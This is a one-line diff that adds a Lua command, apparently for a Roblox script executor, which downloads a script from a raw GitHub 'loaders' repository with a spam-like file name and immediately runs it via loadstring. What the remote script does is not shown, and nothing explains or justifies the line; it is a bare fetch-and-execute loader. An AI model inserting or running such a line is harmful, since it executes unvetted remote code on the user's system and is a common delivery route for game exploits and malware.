@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SlowDamselLog/loaders/main/loaders/heisei-mothra-kaiju-alpha-spam7-klt6tgv9hwy3xb.lua"))()
